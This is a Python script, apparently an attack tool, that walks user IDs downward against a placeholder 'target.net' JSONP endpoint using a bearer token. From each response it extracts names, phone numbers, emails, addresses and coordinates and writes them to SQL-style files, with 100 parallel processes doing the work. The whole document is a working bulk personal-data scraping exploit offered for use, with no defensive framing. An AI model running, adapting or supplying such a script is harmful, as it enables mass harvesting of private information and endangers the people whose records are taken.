#!/usr/bin/python3
from multiprocessing import Pool #<----- pip install
import requests
import random
import time
import json

session = requests.session()
t4_fromWhere = input("START TOP : ex-> 663853 : ▋_ ") or "663853" 
t4_fromWhere=int(t4_fromWhere)
start = time.time()
def reqx(rs):
    for i in range(t4_fromWhere, 0, -1):
        url = f"https://target.net:443/x/x?userId={i}&callback=callbackMethod"
        headers = {"Accept": "*/*", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0", "Accept-Language": "en-us", "Authorization": "Bearer x-x-x-x-x", "Accept-Encoding": "gzip, deflate"}
        s=session.get(url, headers=headers)
        txt=s.text
        try:
            sp=txt.split('callbackMethod(')[1]
            ss=sp.split(')')[0]
            js=json.loads(ss)[0]
            name=js['name']
            phone=js['phone']
            email=js['email']
            address=js['address']
            lat=js['lat']
            lon=js['lon']
            resname=(f'''{name}\n''')
            #print(f'''\x1b[30;38;5;239m{i}\x1b[0m: Name: {name}\x1b[0m''')
            open('resname.sql','a',encoding='utf-8').write(resname)
            res=(f'''("{name}","{phone}","{email}","{address}","{lat}","{lon}"),\n''')
            open('result.sql','a',encoding='utf-8').write(res)
            end = time.time()
            print(f'''\x1b[30;38;5;239m{i}\x1b[0m: Name: {name} - \x1b[30;38;5;137mphone\x1b[0m: {phone} - \x1b[30;38;5;137memail\x1b[0m: {email} | \x1b[30;38;5;197msending\x1b[0m \x1b[30;38;5;147m{format(t4_fromWhere - i)}\x1b[0m in \x1b[30;38;5;147m{format(end - start)}\x1b[0m\x1b[30;38;5;197mSEC\x1b[0m''')
        except:
            continue

possibleCharXXX = 'QWERTYUIOPLKJHGFDSAZXCVBNM'
RanUsernameXXX = ''.join(random.choice(possibleCharXXX) for i in range(t4_fromWhere))
with Pool(processes=100) as pool: #<--- change 100 to 10 if ur pc is shit
    print(pool.map(reqx, RanUsernameXXX))
